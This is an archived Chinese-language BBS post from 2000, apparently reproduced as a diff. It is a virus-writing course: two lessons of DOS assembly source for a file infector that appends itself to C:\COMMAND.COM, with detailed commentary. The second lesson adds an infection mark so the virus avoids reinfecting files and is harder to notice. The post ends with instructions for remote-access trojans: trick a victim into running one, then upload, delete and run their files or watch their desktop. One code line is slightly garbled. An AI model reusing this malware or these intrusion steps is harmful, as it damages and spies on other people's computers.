@@ -1,0 +1,449 @@
+
+發信人: dragon.bbs@bbs.ksvcs.kh.edu.tw (墮落天使--闇影), 信區: Language
+標  題: 史上第一隻病毒.....原始碼
+發信站: 雄商--精靈屋News Server (Mon Aug 28 22:05:11 2000)
+轉信站: cmc!news.cmc!ccnews.nchu!ctu-gate!news.nctu!nsysu-news!ksvcs.kh!KsvcsBB
+出  處: bbs.ksvcs.kh.edu.tw
+
+; -=-=-=-=-=-=-=-=-=-
+; ＬＥＳＳＯＮ ＯＮＥ      如何感染ＣＯＭ檔
+; -=-=-=-=-=-=-=-=-=-
+;
+; 由於ＣＯＭ檔的結構較ＥＸＥ檔簡單，所以我們先從如何感染ＣＯＭ檔學起。
+; 底下這個程式只會感染 C:\COMMAND.COM ，是隻非常簡單的毒
+; 編譯方法如下：
+; 用 TASM LES_1.ASM             或 MASM LES_1.ASM ,,,,
+;    TLINK /T LES_1.OBJ            LINK LES_1.OBJ ,,,,
+;                                  EXE2BIN LES_1.EXE LES_1.COM
+
+
+LESSON_1    SEGMENT
+            ASSUME  CS:LESSON_1,DS:LESSON_1
+            ORG     100h
+START:
+            NOP                         ; ┐
+            NOP                         ; ├> 保留 3 BYTES 的空間
+            NOP                         ; ┘
+
+VIR_START:                              ; 此處才是真正病毒程式的開端
+
+
+            CALL    LOCATE              ; 可以想成 PUSH IP
+LOCATE:                                 ;
+            POP     SI                  ;
+            SUB     SI,OFFSET LOCATE    ; 減掉多餘的值，此時 SI=偏移值
+
+; 由於此毒是接在檔案後面，而被感染的檔案大小不一，所以病毒接在檔案後的
+; 偏移也會不一定，而會造成變數無法定位，所以我們要得知偏移了多少下面程
+; 式只要牽涉到和記憶體定址有關的部份，都會加上 [SI] 偏移值
+
+
+     MOV     AX,WORD PTR DS:FIRST_3_BYTE[SI] ; ┬> 恢復記憶體中，原
+     MOV     DS:[100h],AX                    ; │  檔案開頭，被病毒
+     MOV     AL,DS:FIRST_3_BYTE[SI+2]        ; │  改過的 3 BYTES
+     MOV     DS:[100h+2],AL                  ; ┘
+
+; 因為此毒第一次執行時，之前並沒有感染過檔案，而要恢復此 3 BYTES 時會
+; 蓋到病毒本身，所以一開始我們加了 3 個 NOP 來空出此空間，VIR_START
+; 才是真正的病毒碼開始處
+
+     AX,3D02h                ; 開檔 (讀寫模式)
+     LEA     DX,FILE_NAME[SI]        ; DS:DX 指向要開的檔名
+     INT     21h                     ; 呼叫中斷
+
+; 開檔成功後，傳回 AX=檔案代碼 (FILE HANDLE)
+
+                MOV     BX,AX   ; BX = AX = FILE HANDLE
+
+
+     MOV     AH,3Fh                  ; 讀檔案
+     MOV     CX,3                    ; 讀取 3 BYTES
+     LEA     DX,FIRST_3_BYTE[SI]     ; DS:DX 指向放資料的位址
+     INT     21h                     ; 呼叫中斷
+
+; 這個動作是讀取檔案開頭的 3 BYTES 到 FIRST_3_BYTE，保存起來
+
+
+     MOV     AX,4202h        ; 移動檔案指標 (從檔尾算起)
+     XOR     CX,CX           ; CX = 0
+     XOR     DX,DX           ; DX = 0 ，從檔尾移動 0 BYTES
+     INT     21h             ; 呼叫中斷
+
+; 這個動作是把檔案讀寫指標移到檔尾，而由 DX:AX (DX = HIGH，CX = LOW)
+; 傳回移動後的指標對於檔頭的距離，所以此時 DX = 0 (COM 檔小於 64K)，
+; AX = 檔案長度
+
+     SUB     AX,3                            ; 計算出 JMP 的偏移值
+     MOV     WORD PTR DS:JMP_BYTE[SI+1],AX   ; 保存偏移值
+
+; 這個動作是計算要從檔頭 JMP 至檔尾 (病毒碼開端) 所需的偏移
+
+
+     MOV     AH,40h                  ; 寫檔案
+     MOV     CX,VIR_SIZE             ; CX = 病毒長度
+     LEA     DX,VIR_START[SI]        ; DS:DX 指向病毒程式開端
+     INT     21h                     ; 呼叫中斷
+
+; 這個動作是把病毒本體寫入檔案，由於上個動作已經把檔案指標移到檔尾，
+; 所以這次的寫入是從檔尾開始，也就是說把病毒體串接在檔尾
+
+
+     MOV     AX,4200h        ; 移動檔案指標 (從檔頭算起)
+     XOR     CX,CX           ; CX = 0
+     XOR     DX,DX           ; DX = 0，從檔頭移動 0 BYTES
+     INT     21h             ; 呼叫中斷
+
+; 這個動作是把檔案讀寫指標移到檔頭，以便修改檔頭前 3 BYTES
+
+
+     MOV     AH,40h          ; 寫檔案
+     MOV     CX,3            ; 寫入 3 BYTES
+     LEA     DX,JMP_BYTE[SI] ; DS:DX 指向 JMP 的程式碼
+     INT     21h             ; 呼叫中斷
+
+; 這個動作是把我們原先所記算的 JMP 碼寫到檔頭前 3 BYTES，如此一來程式
+; 一執行就會跳至病毒程式開端
+
+
+     MOV     AH,3Eh  ; 關檔案
+     INT     21h     ; 呼叫中斷
+
+
+     MOV     AX,100h ; AX = 100h (COM 檔一開始執行的位址)
+     PUSH    AX      ; PUSH 給下個 RET 指令的值
+     RET             ; RET 到 100h
+
+; 因為病毒該做的是都做完了，所以返回 100h 去執行原檔案
+
+
+FILE_NAME       DB   'C:\COMMAND.COM',0
+FIRST_3_BYTE    DB   0CDh,20h,?    ; DB 0CDh,20h = INT 20h (程式結束)
+JMP_BYTE        DB   0E9h,?,?      ; 0E9h,?,? = JMP XXXX
+
+MSG             DB   'This is [LESSON ONE] virus by Dark Slayer'
+                DB   ' in Keelung, Taiwan <R.O.C>'
+
+VIR_SIZE        EQU  $-OFFSET VIR_START
+
+LESSON_1        ENDS
+                END  START
+
+
+======================================================================
+  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+  病毒寫作教學 Lesson One: 如何感染ＣＯＭ檔  輔助解說
+  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+           CALL    LOCATE             ; 可以想成 PUSH IP
+LOCATE:                               ;
+           POP     SI                 ;
+           SUB     SI,OFFSET LOCATE   ; 減掉多餘的值，此時 SI=偏移值
+
+ 1.當執行 CALL 指令時, 如果是近程呼叫(near call), 則會把 IP 推入堆疊
+   中, 而IP 內存的是下一個指令的節內位址(offset address), 在這裡就是
+   POP SI 所在的位址, 你可以看到此時 SP 由 FFFEh 變成 FFFCh。
+
+ 2.若是遠程呼叫(far call), 則會依序將 CS 和 IP 推入堆疊中, 效果同
+
+     PUSH CS
+     PUSH IP
+
+ 3.當你看到
+           LOCATE:
+              POP  SI
+              SUB  SI,OFFSET LOCATE
+
+   你一定有點困惑, 既然執行 POP SI 之後 SI 內放的就是本身所在的位址,
+   那SUB SI,OFFSET LOCATE 不就永遠等於零了嗎? 那用 MOV SI,0 或
+   XOR SI,SI不就好了嗎? 這在一般正常的程式的確如此, 問題出在於程式中
+   的偏移值(offset)在用連結器(Linker)連結時就已經給定了, 所以你用debug
+   觀看感染的COMMAND.COM檔時, SUB SI,OFFSET LOCATE 就被反組譯成
+   SUB SI,106h (因為程式由100h開始執行, 3 個 NOP 佔 3 bytes, CALL LOCATE
+   佔 3 bytes), 因此我們必須利用類似上述的方法取得因感染複製所造成的
+   offset 差異, 在後面有參考到變數的地方通通要補償回來。
+
+-------------------------------------------------------------------
+
+    MOV     AX,WORD PTR DS:FIRST_3_BYTE[SI] ; ┬> 恢復記憶體中，原
+    MOV     DS:[100h],AX                    ; │  檔案開頭，被病毒
+    MOV     AL,DS:FIRST_3_BYTE[SI+2]        ; │  改過的 3 BYTES
+    MOV     DS:[100h+2],AL                  ; ┘
+
+ 1.當你執行 LES_1.COM 時, 它會在檔案的開頭前三個bytes放入 int 20h
+   及一個未定義的byte, 蓋掉原來的三個 NOP; 當感染了COMMAND.COM之後,
+   病毒跳回 100h處執行 int 20h, 程式結束, LES_1.COM 本身沒有改變(因
+   為只對COMMAND.COM開檔做感染)
+
+ 2.若你執行被感染的 COMMAND.COM 時, 此段程式會恢復它的前三個 bytes,
+   蓋掉JMP xxx (跳到病毒開頭的指令), 這樣病毒結束複製後, COMMAND.COM
+   才能接著繼續正常的執行(因為我們執行到這裡的當兒已經在病毒碼裡面了,
+   我們要改的是新感染檔案的前三bytes成JMP xxx,在這裡就是 COMMAND.COM
+   自身的重覆感染,但是同時我們要恢復在記憶體裡面的COMMAND.COM的前三個
+   bytes, 這樣才不會發生錯誤)
+
+   下面這段就是病毒複製完後, 跳回檔案正常執行部份的程式碼：
+
+    MOV     AX,100h ; AX = 100h (COM 檔一開始執行的位址)
+    PUSH    AX      ; PUSH 給下個 RET 指令的值
+    RET             ; RET 到 100h
+
+
+ 3.而檔案的前三個 bytes 就是在下列這一段程式碼被儲存到 FIRST_3_BYTE
+   變數所指的位址, 注意到加上 SI 的作用是前面所提為了補償因複製後造
+   成 offset不準所做的修正。
+
+     :
+     :
+    MOV     BX,AX                   ; BX = AX = FILE HANDLE
+    MOV     AH,3Fh                  ; 讀檔案
+    MOV     CX,3                    ; 讀取 3 BYTES
+    LEA     DX,FIRST_3_BYTE[SI]     ; DS:DX 指向放資料的位址
+    INT     21h                     ; 呼叫中斷
+
+-------------------------------------------------------------------
+
+    MOV     AX,4202h        ; 移動檔案指標 (從檔尾算起)
+    XOR     CX,CX           ; CX = 0
+    XOR     DX,DX           ; DX = 0 ，從檔尾移動 0 BYTES
+    INT     21h             ; 呼叫中斷
+    SUB     AX,3                            ; 計算出 JMP 的偏移值
+    MOV     WORD PTR DS:JMP_BYTE[SI+1],AX   ; 保存偏移值
+
+  AX 裡面放的是欲感染檔案的長度, 因為之前我們已經將其前三個 bytes
+  儲存在FIRST_3_BYTE 變數所指的位址, 在後面這個程式段我們會將其前
+  三個 bytes 改成跳至附加在原程式之後病毒的開頭的指令(JMP xxx),
+  那既然這三個 bytes 是跳到病毒毒開頭的指令, 那就該從原檔案長度中
+  扣掉, 這樣得到的才是正確的偏移值 xxx。
+
+  MOV     AX,4200h        ; 移動檔案指標 (從檔頭算起)
+  XOR     CX,CX           ; CX = 0
+  XOR     DX,DX           ; DX = 0，從檔頭移動 0 BYTES
+  INT     21h             ; 呼叫中斷
+  MOV     AH,40h          ; 寫檔案
+  MOV     CX,3            ; 寫入 3 BYTES
+  LEA     DX,JMP_BYTE[SI] ; DS:DX 指向 JMP 的程式碼
+  INT     21h             ; 呼叫中斷
+
+-----------------------------------------------------------------
+
+  MOV     AH,40h                  ; 寫檔案
+  MOV     CX,VIR_SIZE             ; CX = 病毒長度
+  LEA     DX,VIR_START[SI]        ; DS:DX 指向病毒程式開端
+  INT     21h                     ; 呼叫中斷
+   :
+   :
+  VIR_SIZE        EQU     $-OFFSET VIR_START
+
+  這一段將病毒附在被感染檔案之後, 你可能會困惑 VIR_SIZE 是如何算
+  出來的,$ 代表 VIR_SIZE 所在之處的位址, 減去 VIR_START所在之處
+  的位址, 得到的就是病毒的長度了。
+
+  但是之前我不是說過已被感染的檔案其 offset 不準嗎? 那為什麼不必
+  加 SI 呢?因為若offset不正確, 則所有的變數其位址都要調整, 但之間
+  的相對長度不會變。
+
+-------------------------------------------------------------------
+
+FIRST_3_BYTE  DB  0CDh,20h,?    ; DB 0CDh,20h = INT 20h (程式結束)
+JMP_BYTE      DB  0E9h,?,?      ; 0E9h,?,? = JMP XXXX
+
+  這裡要提一下 DB 假指令的使用, 看到 DB 0E9h 就是 near JMP 的運算碼
+  (opcode)了嗎?  那 DB E8h, 0, 0 是什麼?  在這個病毒裡就是 CALL LOCATE;
+  這是寫病毒很常用的技巧, Dark Slayer 他以後應該會在更深入的課程裡做
+  介紹, 這裡就點到為止。
+
+----------------------------------------------------------------------
+
+  這隻教學病毒只會感染 C:\COMMAND.COM, 每當你執行 LES_1.COM 或已被感
+  染的C:\COMMAND.COM 時, C:\COMMAND.COM 就會把病毒附在其後, 檔案大小
+  每次都會增加, 但是不會超過 64K 的。
+
+
+; -=-=-=-=-=-=-=-=-=-
+; ＬＥＳＳＯＮ ＴＷＯ      避免重覆感染
+; -=-=-=-=-=-=-=-=-=-
+;
+;嗨！各位親愛的同學，大家好．．
+;上一課所講的 ＣＯＭ檔感染方法 各位學會了沒？若是還有不瞭解的地方，那還
+;乖一點，先把上一課所講的學會吧。另外．．很感謝病毒奇才 Hitech Pro 幫我
+;做的補充說明，他講的很好．．一些我沒有講到的觀念他都教代的很清楚，所以
+;他的補充說明也很值得一看。
+;
+;第二課所要講的是如何避免檔案重複感染。第一課所講的毒相當簡單，其主要是
+;為了示範如何感染，但是你一定發現了你的 COMMAND.COM 一直在長大，如此是很
+;容易被人發現的，因為檔案一直在長大，磁碟空間也一直在縮小，所以避免重覆
+;感染是很重要的。要如何避免呢？最簡單的方法就是在被感染過的檔案內作記號
+;，下次要感染之前先檢查記號是否存在，如果是就不感染，反之則感染之。我們
+;所採用的方法是..在檔案前 3 BYTES 寫入 JMP XXXX 時，順便加上兩個 2 BYTES
+;的記號。
+;
+;底下就是第二課的毒，除了以第一課的毒為基本架構，加上不重覆感染的程式碼
+;之外，其它部份也有小小的變動。
+
+
+MARK_WORD  EQU     'DS'    ; 此毒的記號，隨便什麼都可以
+
+LESSON_2   SEGMENT
+           ASSUME  CS:LESSON_2,DS:LESSON_2
+           ORG     100h
+START:
+           NOP     ; ┐
+           NOP     ; ├> 保留 5 BYTES 的空間
+           NOP     ; │
+           NOP     ; │  原來是 3 BYTES，但是加上記號後就成了 5 BYTES
+           NOP     ; ┘
+
+VIR_START  ; 此處才是真正病毒程式的開端
+
+
+           CALL    LOCATE                 ; 可以想成 PUSH IP
+LOCATE:                                   ;
+           POP     SI                     ;
+           SUB     SI,OFFSET LOCATE       ; 減掉多餘的值，此時 SI=偏移值
+
+; 由於此毒是接在檔案後面，而被感染的檔案大小不一，所以病毒接在檔案後的
+; 偏移也會不一定，而會造成變數無法定位，所以我們要得知偏移了多少
+; 下面程式只要牽涉到和記憶體定址有關的部份，都會加上 [SI] 偏移值
+
+
+    MOV     AX,WORD PTR DS:FIRST_5_BYTE[SI] ; ┐
+    MOV     DS:[100h],AX                    ; ├> 恢復記憶體中，原
+    MOV     AX,WORD PTR DS:FIRST_5_BYTE[SI+2];│  檔案開頭，被病毒
+    MOV     DS:[100h+2],AX                  ; │  改過的 5 BYTES
+    MOV     AL,DS:FIRST_5_BYTE[SI+4]        ; │
+    MOV     DS:[100h+4],AL                  ; ┘
+
+; 因為此毒第一次執行時，之前並沒有感染過檔案，而要恢復此 5 BYTES時會蓋到
+; 病毒本身，所以一開始我們加了 5 個 NOP 來空出此空間，VIR_START 才是真正
+; 的病毒碼開始處
+
+
+                MOV     AX,3D02h                ; 開檔 (讀寫模式)
+                LEA     DX,FILE_NAME[SI]        ; DS:DX 指向要開的檔名
+                INT     21h                     ; 呼叫中斷
+
+; 開檔成功後，傳回 AX=檔案代碼 (FILE HANDLE)
+
+                MOV     BX,AX   ; BX = AX = FILE HANDLE
+
+
+                MOV     AH,3Fh                  ; 讀檔案
+                MOV     CX,5                    ; 讀取 5 BYTES
+                LEA     DX,FIRST_5_BYTE[SI]     ; DS:DX 指向放資料的位址
+                INT     21h                     ; 呼叫中斷
+
+; 這個動作是讀取檔案開頭的 5 BYTES 到 FIRST_5_BYTE，保存起來
+
+
+; 注意！！！底下的兩行程式就是這一課的精華所在，很簡單吧．．^_^
+
+     CMP     WORD PTR DS:FIRST_5_BYTE[SI+3],MARK_WORD
+     ; 比較將要被感染的檔案前 5 BYTES 內，是否已經有病毒做的記號
+
+     JE      CLOSE   ; 如果有．．表示此檔已經感染過，跳至 CLOSE 關
+                     ; 檔，不重覆感染
+
+
+     MOV     AX,4202h        ; 移動檔案指標 (從檔尾算起)
+     XOR     CX,CX           ; CX = 0
+     XOR     DX,DX           ; DX = 0 ，從檔尾移動 0 BYTES
+     INT     21h             ; 呼叫中斷
+
+; 這個動作是把檔案讀寫指標移到檔尾，而由 DX:AX (DX = HIGH，CX = LOW)傳回
+; 移動後的指標對於檔頭的距離，所以此時 DX = 0 (COM 檔小於 64K)，AX =檔案
+; 長度
+
+
+     SUB     AX,3                            ; 計算出 JMP 的偏移值
+     MOV     WORD PTR DS:JMP_BYTE[SI+1],AX   ; 保存偏移值
+
+; 這個動作是計算要從檔頭 JMP 至檔尾 (病毒碼開端) 所需的偏移
+
+
+     MOV     AH,40h                  ; 寫檔案
+     MOV     CX,VIR_SIZE             ; CX = 病毒長度
+     LEA     DX,VIR_START[SI]        ; DS:DX 指向病毒程式開端
+     INT     21h                     ; 呼叫中斷
+
+; 這個動作是把病毒本體寫入檔案，由於上個動作已經把檔案指標移到檔尾，所以
+; 這次的寫入是從檔尾開始，也就是說把病毒體串接在檔尾
+
+
+                MOV     AX,4200h        ; 移動檔案指標 (從檔頭算起)
+                XOR     CX,CX           ; CX = 0
+                XOR     DX,DX           ; DX = 0，從檔頭移動 0 BYTES
+                INT     21h             ; 呼叫中斷
+
+; 這個動作是把檔案讀寫指標移到檔頭，以便修改檔頭前 5 BYTES
+
+
+                MOV     AH,40h                  ; 寫檔案
+                MOV     CX,5                    ; 寫入 5 BYTES
+                LEA     DX,JMP_AND_MARK[SI]     ; DS:DX 指向 JMP 和 MARK
+                INT     21h                     ; 呼叫中斷
+
+; 這個動作是把我們原先所記算的 JMP 碼與病毒記號寫到檔頭前 5 BYTES，如此
+; 一來程式一執行就會跳至病毒程式開端
+
+
+CLOSE:
+                MOV     AH,3Eh  ; 關檔案
+                INT     21h     ; 呼叫中斷
+
+
+                MOV     AX,100h ; AX = 100h (COM 檔一開始執行的位址)
+                PUSH    AX      ; PUSH 給下個 RET 指令的值
+                RET             ; RET 到 100h
+
+; 因為病毒該做的是都做完了，所以返回 100h 去執行原檔案
+
+
+FILE_NAME      DB   'C:\COMMAND.COM',0
+FIRST_5_BYTE   DB   0CDh,20h,?,?,?  ; DB 0CDh,20h = INT 20h (程式結束)
+
+JMP_AND_MARK    LABEL   WORD
+JMP_BYTE        DB      0E9h,?,?        ; 0E9h,?,? = JMP XXXX
+MARK            DW      MARK_WORD       ; 病毒的記號
+
+MSG             DB      'This is [LESSON TWO] virus by Dark Slayer'
+                DB      ' in Keelung, Taiwan <R.O.C>'
+
+VIR_SIZE        EQU     $-OFFSET VIR_START
+
+LESSON_2        ENDS
+                END     START
+
+.....................................................................
+檔案名稱: newnetspy.zip (106kb) (軟體下載)
+軟體簡介: 一個為中國軟件取回不少面子的國貨，其簡單和直接的使用介面，用來偷東西
+一流。
+1.先騙對方執行nestle.exe這檔案   註: (不要傻傻的在自己主機執行呀)
+2.在自己電腦內開啟NetMonitor.exe這檔案，打開後在最上第二個[計算機]選[添加],打入
+對方的IP按確定後便可連接。
+3.連接後可以上傳、下載、刪除、執行對方的文件及關掉對方電腦等。
+
+檔案名稱: Moresby.zip (74KB) (軟體下載)
+軟體簡介: 這是nestle的附件，把Porsche和spy上傳到對方電腦上執行，在自己主機上執
+行ProComm.exe,在位置上打入對方IP後按Refresh便可看到對方正在執行什麼程式。
+spy的使用方法是在瀏覽器裡打上http://173.173.173.173:7308/按enter，便可瀏覽對方
+的桌面了
+註:[173.173.173.173]改為的對方IP
+
+
+--
+                                   墮落天使---闇影
+--
+☆Origin：高雄高商--精靈屋BBS站 《 bbs.ksvcs.kh.edu.tw 》
+☆From：h160.s133.ts32.hinet.net 
+     _________________________________________________________________
+   
+   [1]分類討論區 [2]全部討論區 [3]上一篇 [4]本討論區 [5]下一篇 [6]回文章
+
+References
+
+   1. http://bbs.cmc.edu.tw/cgi-bin/bbs2www/bbssec
+   2. http://bbs.cmc.edu.tw/cgi-bin/bbs2www/bbsall
+   3. http://bbs.cmc.edu.tw/cgi-bin/bbs2www/bbscon?Language/M.966963346.A=115
+   4. http://bbs.cmc.edu.tw/cgi-bin/bbs2www/bbsdoc?Language=S&Q=116
+   5. http://bbs.cmc.edu.tw/cgi-bin/bbs2www/bbscon?Language/M.967605931.A=117
+   6. http://bbs.cmc.edu.tw/cgi-bin/bbs2www/bbspst?Language/M.967472730.A=116
